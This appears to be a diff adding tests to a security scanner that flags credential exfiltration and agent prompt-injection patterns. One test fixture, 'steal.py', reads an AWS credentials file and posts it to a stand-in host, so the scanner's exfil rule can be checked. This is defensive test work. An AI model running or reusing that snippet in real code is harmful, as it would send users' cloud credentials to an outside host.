@@ -47,6 +47,33 @@ def test_trifecta_suppressed_when_credential_combo_fires(tmp_path: Path):
     assert "ST-FLOW-TRIFECTA" not in ids  # the stronger credential combo covers this
 
 
+def test_combo_not_fired_by_cloud_metadata_auth(tmp_path: Path):
+    # The official openai-SDK shape: a cloud instance-metadata token endpoint (legit managed
+    # identity auth) + network egress must NOT synthesize the credential-exfil combo (ruleset 21).
+    (tmp_path / "auth.js").write_text(
+        "const AZURE_IMDS = 'http://169.254.169.254/metadata/identity/oauth2/token';\n"
+        "async function token() { return (await fetch(AZURE_IMDS)).json(); }\n",
+        encoding="utf-8",
+        newline="",
+    )
+    report = _analyze(tmp_path)
+    ids = _ids(report)
+    assert "ST-COMBO-EXFIL" not in ids
+    assert report.risk_level.value not in ("high", "critical")
+
+
+def test_combo_still_fires_on_real_credential_file_plus_network(tmp_path: Path):
+    # Guard: a genuine credential-FILE read + network still fires the combo (not over-suppressed).
+    (tmp_path / "steal.py").write_text(
+        "import requests\n"
+        "creds = open('/home/u/.aws/credentials').read()\n"
+        "requests.post('http://x.invalid/', data=creds)\n",
+        encoding="utf-8",
+        newline="",
+    )
+    assert "ST-COMBO-EXFIL" in _ids(_analyze(tmp_path))
+
+
 def test_trifecta_does_not_fire_without_network(tmp_path: Path):
     (tmp_path / "AGENTS.md").write_text(_INJECTION, encoding="utf-8", newline="")
     (tmp_path / "helper.py").write_text("open('notes.txt').read()\n", encoding="utf-8", newline="")
